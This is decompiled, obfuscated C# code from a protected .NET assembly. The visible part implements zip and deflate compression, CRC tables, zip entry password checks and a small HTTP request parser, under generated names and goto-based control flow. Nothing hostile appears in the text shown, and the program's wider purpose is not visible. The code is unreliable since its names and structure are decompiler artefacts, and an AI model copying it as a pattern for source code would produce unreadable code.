using Ionic;
using Ionic.Zip;
using karo;
using ns0;
using ns1;
using ns10;
using ns11;
using ns13;
using ns14;
using ns15;
using ns2;
using ns3;
using ns4;
using ns5;
using ns6;
using ns7;
using ns8;
using ns9;
using SmartAssembly.MemoryManagement;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ns12
{
	internal sealed class Class16
	{
		static void smethod_0(Class33 class33_0)
		{
			Class16.smethod_478(class33_0.class32_0, 24, (uint)class33_0.int_8);
			Class16.smethod_143(class33_0);
			Class16.smethod_470(class33_0);
		}

		static bool smethod_1(string string_0, Class62 class62_0)
		{
			int num = string_0.IndexOf("\r\n\r\n");
			bool result;
			if (num == -1)
			{
				result = false;
			}
			else
			{
				class62_0.stringDictionary_0 = Class16.smethod_536(class62_0, string_0);
				if (Class16.smethod_604(class62_0).ToUpper().Equals("POST"))
				{
					try
					{
						int num2 = int.Parse(Class16.smethod_465(class62_0)["Content-Length"]);
						result = (string_0.Length >= num + 6 + num2);
						return result;
					}
					catch
					{
						class62_0.method_5();
						result = true;
						return result;
					}
				}
				result = true;
			}
			return result;
		}

		static int smethod_2(Class41 class41_0, int int_0, Class43 class43_0)
		{
			GClass2 gclass2_ = class41_0.gclass2_0;
			int num = gclass2_.int_0;
			int num2 = gclass2_.int_1;
			int num3 = class41_0.int_9;
			int i = class41_0.int_8;
			int num4 = class41_0.int_13;
			int num5 = (num4 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4);
			while (true)
			{
				int num6;
				switch (class43_0.int_0)
				{
				case 0:
					if (num5 >= 258 && num2 >= 10)
					{
						class41_0.int_9 = num3;
						class41_0.int_8 = i;
						gclass2_.int_1 = num2;
						gclass2_.long_0 += (long)(num - gclass2_.int_0);
						gclass2_.int_0 = num;
						class41_0.int_13 = num4;
						int byte_ = (int)class43_0.byte_0;
						int byte_2 = (int)class43_0.byte_1;
						int[] int_ = class43_0.int_8;
						int int_2 = class43_0.int_9;
						int[] int_3 = class43_0.int_10;
						int int_4 = class43_0.int_11;
						int_0 = Class16.smethod_454(class41_0, int_4, int_3, class43_0, int_2, byte_, gclass2_, int_, byte_2);
						num = gclass2_.int_0;
						num2 = gclass2_.int_1;
						num3 = class41_0.int_9;
						i = class41_0.int_8;
						num4 = class41_0.int_13;
						num5 = ((num4 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4));
						if (int_0 != 0)
						{
							class43_0.int_0 = ((int_0 == 1) ? 7 : 9);
							continue;
						}
					}
					class43_0.int_4 = (int)class43_0.byte_0;
					class43_0.int_2 = class43_0.int_8;
					class43_0.int_3 = class43_0.int_9;
					class43_0.int_0 = 1;
					goto IL_44A;
				case 1:
					goto IL_44A;
				case 2:
					num6 = class43_0.int_6;
					while (i < num6)
					{
						if (num2 == 0)
						{
							goto IL_7AD;
						}
						int_0 = 0;
						num2--;
						num3 |= (int)(gclass2_.byte_0[num++] & 255) << i;
						i += 8;
					}
					class43_0.int_1 += (num3 & Class42.int_0[num6]);
					num3 >>= num6;
					i -= num6;
					class43_0.int_4 = (int)class43_0.byte_1;
					class43_0.int_2 = class43_0.int_10;
					class43_0.int_3 = class43_0.int_11;
					class43_0.int_0 = 3;
					goto IL_2E3;
				case 3:
					goto IL_2E3;
				case 4:
					num6 = class43_0.int_6;
					while (i < num6)
					{
						if (num2 == 0)
						{
							goto IL_8A4;
						}
						int_0 = 0;
						num2--;
						num3 |= (int)(gclass2_.byte_0[num++] & 255) << i;
						i += 8;
					}
					class43_0.int_7 += (num3 & Class42.int_0[num6]);
					num3 >>= num6;
					i -= num6;
					class43_0.int_0 = 5;
					goto IL_143;
				case 5:
					goto IL_143;
				case 6:
					if (num5 == 0)
					{
						if (num4 == class41_0.int_11 && class41_0.int_12 != 0)
						{
							num4 = 0;
							num5 = ((0 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4));
						}
						if (num5 == 0)
						{
							class41_0.int_13 = num4;
							int_0 = Class16.smethod_223(class41_0, int_0);
							num4 = class41_0.int_13;
							num5 = ((num4 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4));
							if (num4 == class41_0.int_11 && class41_0.int_12 != 0)
							{
								num4 = 0;
								num5 = ((0 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4));
							}
							if (num5 == 0)
							{
								goto IL_938;
							}
						}
					}
					int_0 = 0;
					class41_0.byte_0[num4++] = (byte)class43_0.int_5;
					num5--;
					class43_0.int_0 = 0;
					continue;
				case 7:
					goto IL_982;
				case 8:
					goto IL_A33;
				case 9:
					goto IL_A80;
				}
				break;
				IL_143:
				int j;
				for (j = num4 - class43_0.int_7; j < 0; j += class41_0.int_11)
				{
				}
				while (class43_0.int_1 != 0)
				{
					if (num5 == 0)
					{
						if (num4 == class41_0.int_11 && class41_0.int_12 != 0)
						{
							num4 = 0;
							num5 = ((0 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4));
						}
						if (num5 == 0)
						{
							class41_0.int_13 = num4;
							int_0 = Class16.smethod_223(class41_0, int_0);
							num4 = class41_0.int_13;
							num5 = ((num4 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4));
							if (num4 == class41_0.int_11 && class41_0.int_12 != 0)
							{
								num4 = 0;
								num5 = ((0 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4));
							}
							if (num5 == 0)
							{
								goto IL_8EE;
							}
						}
					}
					class41_0.byte_0[num4++] = class41_0.byte_0[j++];
					num5--;
					if (j == class41_0.int_11)
					{
						j = 0;
					}
					class43_0.int_1--;
				}
				class43_0.int_0 = 0;
				continue;
				IL_2E3:
				num6 = class43_0.int_4;
				while (i < num6)
				{
					if (num2 == 0)
					{
						goto IL_85A;
					}
					int_0 = 0;
					num2--;
					num3 |= (int)(gclass2_.byte_0[num++] & 255) << i;
					i += 8;
				}
				int num7 = (class43_0.int_3 + (num3 & Class42.int_0[num6])) * 3;
				num3 >>= class43_0.int_2[num7 + 1];
				i -= class43_0.int_2[num7 + 1];
				int num8 = class43_0.int_2[num7];
				if ((num8 & 16) != 0)
				{
					class43_0.int_6 = (num8 & 15);
					class43_0.int_7 = class43_0.int_2[num7 + 2];
					class43_0.int_0 = 4;
					continue;
				}
				if ((num8 & 64) == 0)
				{
					class43_0.int_4 = num8;
					class43_0.int_3 = num7 / 3 + class43_0.int_2[num7 + 2];
					continue;
				}
				goto IL_7F7;
				IL_44A:
				num6 = class43_0.int_4;
				while (i < num6)
				{
					if (num2 == 0)
					{
						goto IL_763;
					}
					int_0 = 0;
					num2--;
					num3 |= (int)(gclass2_.byte_0[num++] & 255) << i;
					i += 8;
				}
				num7 = (class43_0.int_3 + (num3 & Class42.int_0[num6])) * 3;
				num3 >>= class43_0.int_2[num7 + 1];
				i -= class43_0.int_2[num7 + 1];
				num8 = class43_0.int_2[num7];
				if (num8 == 0)
				{
					class43_0.int_5 = class43_0.int_2[num7 + 2];
					class43_0.int_0 = 6;
				}
				else if ((num8 & 16) != 0)
				{
					class43_0.int_6 = (num8 & 15);
					class43_0.int_1 = class43_0.int_2[num7 + 2];
					class43_0.int_0 = 2;
				}
				else if ((num8 & 64) == 0)
				{
					class43_0.int_4 = num8;
					class43_0.int_3 = num7 / 3 + class43_0.int_2[num7 + 2];
				}
				else
				{
					if ((num8 & 32) == 0)
					{
						goto IL_700;
					}
					class43_0.int_0 = 7;
				}
			}
			int_0 = -2;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_.int_1 = num2;
			gclass2_.long_0 += (long)(num - gclass2_.int_0);
			gclass2_.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, -2);
			IL_700:
			class43_0.int_0 = 9;
			gclass2_.string_0 = "invalid literal/length code";
			int_0 = -3;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_.int_1 = num2;
			gclass2_.long_0 += (long)(num - gclass2_.int_0);
			gclass2_.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, -3);
			IL_763:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_.int_1 = num2;
			gclass2_.long_0 += (long)(num - gclass2_.int_0);
			gclass2_.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_7AD:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_.int_1 = num2;
			gclass2_.long_0 += (long)(num - gclass2_.int_0);
			gclass2_.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_7F7:
			class43_0.int_0 = 9;
			gclass2_.string_0 = "invalid distance code";
			int_0 = -3;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_.int_1 = num2;
			gclass2_.long_0 += (long)(num - gclass2_.int_0);
			gclass2_.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, -3);
			IL_85A:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_.int_1 = num2;
			gclass2_.long_0 += (long)(num - gclass2_.int_0);
			gclass2_.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_8A4:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_.int_1 = num2;
			gclass2_.long_0 += (long)(num - gclass2_.int_0);
			gclass2_.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_8EE:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_.int_1 = num2;
			gclass2_.long_0 += (long)(num - gclass2_.int_0);
			gclass2_.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_938:
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_.int_1 = num2;
			gclass2_.long_0 += (long)(num - gclass2_.int_0);
			gclass2_.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, int_0);
			IL_982:
			if (i > 7)
			{
				i -= 8;
				num2++;
				num--;
			}
			class41_0.int_13 = num4;
			int_0 = Class16.smethod_223(class41_0, int_0);
			num4 = class41_0.int_13;
			int arg_9D2_0 = (num4 < class41_0.int_12) ? (class41_0.int_12 - num4 - 1) : (class41_0.int_11 - num4);
			if (class41_0.int_12 != class41_0.int_13)
			{
				class41_0.int_9 = num3;
				class41_0.int_8 = i;
				gclass2_.int_1 = num2;
				gclass2_.long_0 += (long)(num - gclass2_.int_0);
				gclass2_.int_0 = num;
				class41_0.int_13 = num4;
				return Class16.smethod_223(class41_0, int_0);
			}
			class43_0.int_0 = 8;
			IL_A33:
			int_0 = 1;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_.int_1 = num2;
			gclass2_.long_0 += (long)(num - gclass2_.int_0);
			gclass2_.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, 1);
			IL_A80:
			int_0 = -3;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_.int_1 = num2;
			gclass2_.long_0 += (long)(num - gclass2_.int_0);
			gclass2_.int_0 = num;
			class41_0.int_13 = num4;
			return Class16.smethod_223(class41_0, -3);
		}

		static GClass0 smethod_3(string string_0, GClass1 gclass1_0)
		{
			GClass0 gClass = Class16.smethod_358(string_0);
			gClass.class8_0 = new Class8(gclass1_0);
			Class16.smethod_404(gClass);
			gClass.AlternateEncoding = gclass1_0.encoding_0;
			gClass.AlternateEncodingUsage = gclass1_0.enum9_0;
			DateTime now = DateTime.Now;
			DateTime now2 = DateTime.Now;
			DateTime now3 = DateTime.Now;
			Class16.smethod_144(now, now3, now2, gClass);
			gClass.EmitTimesInWindowsFormatWhenSaving = gclass1_0.bool_2;
			gClass.EmitTimesInUnixFormatWhenSaving = gclass1_0.bool_3;
			gClass.enum0_0 = Enum0.const_2;
			Class16.smethod_634(gClass.string_1, gClass, gclass1_0);
			Class16.smethod_522(gClass, gclass1_0);
			return gClass;
		}

		static int smethod_4(Stream13 stream13_0)
		{
			return (int)(~(int)stream13_0.gclass3_0.uint_2);
		}

		static void smethod_5(Class33 class33_0)
		{
			class33_0.int_7 = Class33.int_15 * class33_0.int_3;
			class33_0.int_6 = 0;
			class33_0.bool_1 = false;
			class33_0.bool_0 = true;
			Class16.smethod_640(class33_0);
			if (class33_0.bool_0 && class33_0.int_6 > class33_0.int_7)
			{
				Class16.smethod_425(class33_0);
				class33_0.int_6 = 0;
				class33_0.int_7 = 0;
				class33_0.bool_0 = false;
				Class16.smethod_640(class33_0);
			}
			int[] int_ = class33_0.class34_0.int_13;
			class33_0.int_8 = -1;
			int i = 0;
			int int_2 = class33_0.int_3;
			while (i <= int_2)
			{
				if (int_[i] == 0)
				{
					class33_0.int_8 = i;
					return;
				}
				i++;
			}
		}

		static void smethod_6(long long_0, Stream4 stream4_0)
		{
			stream4_0.long_0 -= long_0;
			if (stream4_0.long_0 < 0L)
			{
				throw new InvalidOperationException();
			}
			if (stream4_0.stream_0 is Stream4)
			{
				Class16.smethod_6(long_0, (Stream4)stream4_0.stream_0);
			}
		}

		static void smethod_7(long long_0, GClass0 gclass0_0, long long_1)
		{
			if (gclass0_0.class8_0.gclass1_0 != null)
			{
				gclass0_0.bool_12 = Class16.smethod_147(long_0, gclass0_0.class8_0.gclass1_0, long_1, gclass0_0);
			}
		}

		static void smethod_8(ZipSegmentedStream zipSegmentedStream_0, uint uint_0)
		{
			if (zipSegmentedStream_0.stream_0 != null)
			{
				zipSegmentedStream_0.stream_0.Dispose();
				if (File.Exists(Class16.smethod_455(zipSegmentedStream_0)))
				{
					File.Delete(Class16.smethod_455(zipSegmentedStream_0));
				}
				File.Move(zipSegmentedStream_0.string_3, Class16.smethod_455(zipSegmentedStream_0));
			}
			if (uint_0 > 0u)
			{
				Class16.smethod_472(zipSegmentedStream_0, zipSegmentedStream_0.uint_0 + uint_0);
			}
			Class16.smethod_354(zipSegmentedStream_0.string_1, out zipSegmentedStream_0.stream_0, out zipSegmentedStream_0.string_3);
			if (zipSegmentedStream_0.uint_0 == 0u)
			{
				zipSegmentedStream_0.stream_0.Write(BitConverter.GetBytes(134695760), 0, 4);
			}
		}

		static void smethod_9(Enum25 enum25_0, Class54 class54_0)
		{
			class54_0.enum25_0 = enum25_0;
		}

		static bool smethod_10(GClass1 gclass1_0, string string_0)
		{
			return gclass1_0.dictionary_0.ContainsKey(Class16.smethod_11(string_0));
		}

		static string smethod_11(string string_0)
		{
			if (string.IsNullOrEmpty(string_0))
			{
				return string_0;
			}
			if (string_0.Length >= 2 && string_0[1] == ':' && string_0[2] == '\\')
			{
				string_0 = string_0.Substring(3);
			}
			string_0 = string_0.Replace('\\', '/');
			while (string_0.StartsWith("/"))
			{
				string_0 = string_0.Substring(1);
			}
			return Class16.smethod_71(string_0);
		}

		static GClass1 smethod_12(string string_0)
		{
			return Class16.smethod_660(string_0, null, null, null);
		}

		static void smethod_13(int int_0, bool bool_0, int int_1, Class39 class39_0)
		{
			Class16.smethod_508(class39_0);
			class39_0.int_50 = 8;
			if (bool_0)
			{
				class39_0.byte_0[class39_0.int_21++] = (byte)int_1;
				class39_0.byte_0[class39_0.int_21++] = (byte)(int_1 >> 8);
				class39_0.byte_0[class39_0.int_21++] = (byte)(~(byte)int_1);
				class39_0.byte_0[class39_0.int_21++] = (byte)(~int_1 >> 8);
			}
			Class16.smethod_70(class39_0, class39_0.byte_1, int_0, int_1);
		}

		static string smethod_14(int int_0)
		{
			StringBuilder stringBuilder = new StringBuilder();
			RNGCryptoServiceProvider rngcryptoServiceProvider_ = new RNGCryptoServiceProvider();
			while (int_0-- > 0)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[Class16.smethod_641(rngcryptoServiceProvider_, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
			}
			return stringBuilder.ToString();
		}

		static void smethod_15(bool bool_0, Stream0 stream0_0)
		{
			stream0_0.dictionary_0.Add(stream0_0.gclass0_0.string_1, stream0_0.gclass0_0);
			stream0_0.int_0++;
			if (stream0_0.int_0 > 65534 && stream0_0.enum8_0 == Enum8.const_0)
			{
				stream0_0.bool_2 = true;
				throw new InvalidOperationException("Too many entries. Consider setting ZipOutputStream.EnableZip64.");
			}
			Class16.smethod_135(stream0_0.gclass0_0, stream0_0.stream_0, bool_0 ? 99 : 0);
			Class16.smethod_323(stream0_0.gclass0_0);
			if (!stream0_0.gclass0_0.bool_4)
			{
				GClass0 gclass0_ = stream0_0.gclass0_0;
				Stream stream_ = stream0_0.stream_0;
				Class16.smethod_95(stream_, gclass0_);
				Class16.smethod_395(stream0_0.gclass0_0, stream0_0.stream_0, bool_0 ? 0L : -1L, out stream0_0.stream4_0, out stream0_0.stream_1, out stream0_0.stream_2, ref stream0_0.stream13_0);
			}
			stream0_0.bool_5 = false;
		}

		static void smethod_16(GClass1 gclass1_0, GClass0 gclass0_0)
		{
			if (gclass0_0 == null)
			{
				throw new ArgumentNullException("entry");
			}
			gclass1_0.dictionary_0.Remove(Class16.smethod_11(gclass0_0.string_1));
			gclass1_0.list_0 = null;
			gclass1_0.bool_5 = true;
		}

		static void smethod_17(int int_0, int int_1, Stream6 stream6_0)
		{
			Stream6.Class35 class35_ = stream6_0.class35_0;
			char[][] char_ = class35_.char_0;
			for (int i = 0; i < int_0; i++)
			{
				int num = 32;
				int num2 = 0;
				char[] array = char_[i];
				int num3 = int_1;
				while (--num3 >= 0)
				{
					char c = array[num3];
					if ((int)c > num2)
					{
						num2 = (int)c;
					}
					if ((int)c < num)
					{
						num = (int)c;
					}
				}
				int[] int_2 = class35_.int_1[i];
				int[] int_3 = class35_.int_2[i];
				int[] int_4 = class35_.int_3[i];
				char[] char_2 = char_[i];
				Class16.smethod_149(int_4, int_1, num2, char_2, int_2, int_3, num);
				class35_.int_4[i] = num;
			}
		}

		static void smethod_18(Class55 class55_0, string string_0)
		{
			if (string_0 == null)
			{
				throw new ArgumentNullException();
			}
			class55_0.string_0 = string_0;
		}

		static byte[] smethod_19(long long_0, long long_1, int int_0, uint uint_0)
		{
			byte[] array = new byte[76];
			byte[] bytes = BitConverter.GetBytes(101075792u);
			Array.Copy(bytes, 0, array, 0, 4);
			int num = 0 + 4;
			Array.Copy(BitConverter.GetBytes(44L), 0, array, 4, 8);
			num = 4 + 8;
			byte[] arg_47_0 = array;
			int expr_41 = 12;
			num = expr_41 + 1;
			arg_47_0[expr_41] = 45;
			byte[] arg_50_0 = array;
			int expr_4B = 13;
			num = expr_4B + 1;
			arg_50_0[expr_4B] = 0;
			byte[] arg_5A_0 = array;
			int expr_54 = 14;
			num = expr_54 + 1;
			arg_5A_0[expr_54] = 45;
			byte[] arg_63_0 = array;
			int expr_5E = 15;
			num = expr_5E + 1;
			arg_63_0[expr_5E] = 0;
			for (int i = 0; i < 8; i++)
			{
				array[num++] = 0;
			}
			long value = (long)int_0;
			Array.Copy(BitConverter.GetBytes(value), 0, array, num, 8);
			num += 8;
			Array.Copy(BitConverter.GetBytes(value), 0, array, num, 8);
			num += 8;
			long value2 = long_1 - long_0;
			Array.Copy(BitConverter.GetBytes(value2), 0, array, num, 8);
			num += 8;
			Array.Copy(BitConverter.GetBytes(long_0), 0, array, num, 8);
			num += 8;
			bytes = BitConverter.GetBytes(117853008u);
			Array.Copy(bytes, 0, array, num, 4);
			num += 4;
			uint value3 = (uint_0 == 0u) ? 0u : (uint_0 - 1u);
			Array.Copy(BitConverter.GetBytes(value3), 0, array, num, 4);
			num += 4;
			Array.Copy(BitConverter.GetBytes(long_1), 0, array, num, 8);
			num += 8;
			Array.Copy(BitConverter.GetBytes(uint_0), 0, array, num, 4);
			num += 4;
			return array;
		}

		static int smethod_20(Class74.Stream14 stream14_0)
		{
			return stream14_0.ReadByte() | stream14_0.ReadByte() << 8;
		}

		static Class22 smethod_21(string string_0, GClass0 gclass0_0)
		{
			Stream stream_ = gclass0_0.stream_0;
			gclass0_0.byte_3 = new byte[12];
			byte[] byte_ = gclass0_0.byte_3;
			Class22 @class = new Class22();
			if (string_0 == null)
			{
				throw new BadPasswordException("This entry requires a password.");
			}
			Class16.smethod_377(@class, string_0);
			Class16.smethod_414(byte_, stream_);
			byte[] array = Class16.smethod_77(byte_, byte_.Length, @class);
			if (array[11] != (byte)(gclass0_0.int_2 >> 24 & 255))
			{
				if ((gclass0_0.short_7 & 8) != 8)
				{
					throw new BadPasswordException("The password did not match.");
				}
				if (array[11] != (byte)(gclass0_0.int_1 >> 8 & 255))
				{
					throw new BadPasswordException("The password did not match.");
				}
			}
			return @class;
		}

		static long smethod_22(Stream13 stream13_0)
		{
			return stream13_0.gclass3_0.long_0;
		}

		static void smethod_23(GClass3 gclass3_0)
		{
			gclass3_0.uint_1 = new uint[256];
			byte b = 0;
			do
			{
				uint num = (uint)b;
				for (byte b2 = 8; b2 > 0; b2 -= 1)
				{
					if ((num & 1u) == 1u)
					{
						num = (num >> 1 ^ gclass3_0.uint_0);
					}
					else
					{
						num >>= 1;
					}
				}
				if (gclass3_0.bool_0)
				{
					gclass3_0.uint_1[(int)Class16.smethod_372(b)] = Class16.smethod_249(num);
				}
				else
				{
					gclass3_0.uint_1[(int)b] = num;
				}
				b += 1;
			}
			while (b != 0);
		}

		static bool smethod_24(Class17 class17_0, string string_0)
		{
			return class17_0.class9_0.vmethod_0(string_0);
		}

		static long smethod_25(Stream4 stream4_0)
		{
			return stream4_0.long_1;
		}

		static void smethod_26(GClass0 gclass0_0, Exception exception_0)
		{
			if (gclass0_0.class8_0.gclass1_0 != null)
			{
				gclass0_0.bool_12 = Class16.smethod_514(gclass0_0, exception_0, gclass0_0.class8_0.gclass1_0);
			}
		}

		static bool smethod_27(Class33 class33_0, Class33.Class34 class34_0, int int_0, int int_1, int int_2)
		{
			int num = int_1 - int_0 + 1;
			if (num < 2)
			{
				return class33_0.bool_0 && class33_0.int_6 > class33_0.int_7;
			}
			int num2 = 0;
			while (Class33.int_16[num2] < num)
			{
				num2++;
			}
			int[] int_3 = class34_0.int_13;
			char[] char_ = class34_0.char_1;
			byte[] byte_ = class34_0.byte_6;
			int int_4 = class33_0.int_3;
			int num3 = int_4 + 1;
			bool bool_ = class33_0.bool_0;
			int int_5 = class33_0.int_7;
			int num4 = class33_0.int_6;
			while (--num2 >= 0)
			{
				int num5 = Class33.int_16[num2];
				int num6 = int_0 + num5 - 1;
				int i = int_0 + num5;
				while (i <= int_1)
				{
					int num7 = 3;
					while (i <= int_1 && --num7 >= 0)
					{
						int num8 = int_3[i];
						int num9 = num8 + int_2;
						int num10 = i;
						bool flag = false;
						int num11 = 0;
						while (true)
						{
							IL_3D5:
							if (flag)
							{
								int_3[num10] = num11;
								if ((num10 -= num5) <= num6)
								{
									break;
								}
							}
							else
							{
								flag = true;
							}
							num11 = int_3[num10 - num5];
							int num12 = num11 + int_2;
							int num13 = num9;
							if (byte_[num12 + 1] == byte_[num13 + 1])
							{
								if (byte_[num12 + 2] == byte_[num13 + 2])
								{
									if (byte_[num12 + 3] == byte_[num13 + 3])
									{
										if (byte_[num12 + 4] == byte_[num13 + 4])
										{
											if (byte_[num12 + 5] == byte_[num13 + 5])
											{
												if (byte_[num12 += 6] == byte_[num13 += 6])
												{
													int j = int_4;
													while (j > 0)
													{
														j -= 4;
														if (byte_[num12 + 1] == byte_[num13 + 1])
														{
															if (char_[num12] == char_[num13])
															{
																if (byte_[num12 + 2] == byte_[num13 + 2])
																{
																	if (char_[num12 + 1] == char_[num13 + 1])
																	{
																		if (byte_[num12 + 3] == byte_[num13 + 3])
																		{
																			if (char_[num12 + 2] == char_[num13 + 2])
																			{
																				if (byte_[num12 + 4] == byte_[num13 + 4])
																				{
																					if (char_[num12 + 3] == char_[num13 + 3])
																					{
																						if ((num12 += 4) >= num3)
																						{
																							num12 -= num3;
																						}
																						if ((num13 += 4) >= num3)
																						{
																							num13 -= num3;
																						}
																						num4++;
																					}
																					else
																					{
																						if (char_[num12 + 3] > char_[num13 + 3])
																						{
																							goto IL_3D5;
																						}
																						break;
																					}
																				}
																				else
																				{
																					if ((byte_[num12 + 4] & 255) > (byte_[num13 + 4] & 255))
																					{
																						goto IL_3D5;
																					}
																					break;
																				}
																			}
																			else
																			{
																				if (char_[num12 + 2] > char_[num13 + 2])
																				{
																					goto IL_3D5;
																				}
																				break;
																			}
																		}
																		else
																		{
																			if ((byte_[num12 + 3] & 255) > (byte_[num13 + 3] & 255))
																			{
																				goto IL_3D5;
																			}
																			break;
																		}
																	}
																	else
																	{
																		if (char_[num12 + 1] > char_[num13 + 1])
																		{
																			goto IL_3D5;
																		}
																		break;
																	}
																}
																else
																{
																	if ((byte_[num12 + 2] & 255) > (byte_[num13 + 2] & 255))
																	{
																		goto IL_3D5;
																	}
																	break;
																}
															}
															else
															{
																if (char_[num12] > char_[num13])
																{
																	goto IL_3D5;
																}
																break;
															}
														}
														else
														{
															if ((byte_[num12 + 1] & 255) > (byte_[num13 + 1] & 255))
															{
																goto IL_3D5;
															}
															break;
														}
													}
													break;
												}
												if ((byte_[num12] & 255) <= (byte_[num13] & 255))
												{
													break;
												}
											}
											else if ((byte_[num12 + 5] & 255) <= (byte_[num13 + 5] & 255))
											{
												break;
											}
										}
										else if ((byte_[num12 + 4] & 255) <= (byte_[num13 + 4] & 255))
										{
											break;
										}
									}
									else if ((byte_[num12 + 3] & 255) <= (byte_[num13 + 3] & 255))
									{
										break;
									}
								}
								else if ((byte_[num12 + 2] & 255) <= (byte_[num13 + 2] & 255))
								{
									break;
								}
							}
							else if ((byte_[num12 + 1] & 255) <= (byte_[num13 + 1] & 255))
							{
								break;
							}
						}
						IL_3DE:
						int_3[num10] = num8;
						i++;
						continue;
						goto IL_3DE;
					}
					if (bool_ && i <= int_1 && num4 > int_5)
					{
						goto IL_414;
					}
				}
			}
			IL_414:
			class33_0.int_6 = num4;
			return bool_ && num4 > int_5;
		}

		static GClass0 smethod_28(GClass1 gclass1_0, Dictionary<string, object> dictionary_0)
		{
			Stream readStream = gclass1_0.ReadStream;
			Encoding encoding = (gclass1_0.enum9_0 == Enum9.const_3) ? gclass1_0.encoding_0 : GClass1.encoding_1;
			int num = Class16.smethod_456(readStream);
			if (num != 33639248)
			{
				readStream.Seek(-4L, SeekOrigin.Current);
				if ((long)num != 101010256L && (long)num != 101075792L && num != 67324752)
				{
					throw new BadReadException(string.Format("  Bad signature (0x{0:X8}) at position 0x{1:X8}", num, readStream.Position));
				}
				return null;
			}
			else
			{
				int num2 = 46;
				byte[] array = new byte[42];
				int num3 = readStream.Read(array, 0, array.Length);
				if (num3 != array.Length)
				{
					return null;
				}
				GClass0 gClass = new GClass0();
				gClass.AlternateEncoding = encoding;
				gClass.enum0_0 = Enum0.const_3;
				gClass.class8_0 = new Class8(gclass1_0);
				GClass0 arg_DF_0 = gClass;
				byte[] arg_CE_0 = array;
				int expr_CA = 0;
				int arg_CD_0 = expr_CA + 1;
				int arg_DD_0 = arg_CE_0[expr_CA];
				byte[] arg_D6_0 = array;
				int expr_D2 = 1;
				int arg_D5_0 = expr_D2 + 1;
				arg_DF_0.short_0 = (short)(arg_DD_0 + arg_D6_0[expr_D2] * 256);
				GClass0 arg_FE_0 = gClass;
				byte[] arg_ED_0 = array;
				int expr_E9 = 2;
				int arg_EC_0 = expr_E9 + 1;
				int arg_FC_0 = arg_ED_0[expr_E9];
				byte[] arg_F5_0 = array;
				int expr_F1 = 3;
				int arg_F4_0 = expr_F1 + 1;
				arg_FE_0.short_6 = (short)(arg_FC_0 + arg_F5_0[expr_F1] * 256);
				GClass0 arg_11D_0 = gClass;
				byte[] arg_10C_0 = array;
				int expr_108 = 4;
				int arg_10B_0 = expr_108 + 1;
				int arg_11B_0 = arg_10C_0[expr_108];
				byte[] arg_114_0 = array;
				int expr_110 = 5;
				int arg_113_0 = expr_110 + 1;
				arg_11D_0.short_7 = (short)(arg_11B_0 + arg_114_0[expr_110] * 256);
				GClass0 arg_13C_0 = gClass;
				byte[] arg_12B_0 = array;
				int expr_127 = 6;
				int arg_12A_0 = expr_127 + 1;
				int arg_13A_0 = arg_12B_0[expr_127];
				byte[] arg_133_0 = array;
				int expr_12F = 7;
				int arg_132_0 = expr_12F + 1;
				arg_13C_0.short_8 = (short)(arg_13A_0 + arg_133_0[expr_12F] * 256);
				GClass0 arg_18D_0 = gClass;
				byte[] arg_14A_0 = array;
				int expr_146 = 8;
				int arg_149_0 = expr_146 + 1;
				int arg_15A_0 = arg_14A_0[expr_146];
				byte[] arg_153_0 = array;
				int expr_14F = 9;
				int arg_152_0 = expr_14F + 1;
				int arg_170_0 = arg_15A_0 + arg_153_0[expr_14F] * 256;
				byte[] arg_163_0 = array;
				int expr_15F = 10;
				int arg_162_0 = expr_15F + 1;
				int arg_18C_0 = arg_170_0 + arg_163_0[expr_15F] * 256 * 256;
				byte[] arg_179_0 = array;
				int expr_175 = 11;
				int arg_178_0 = expr_175 + 1;
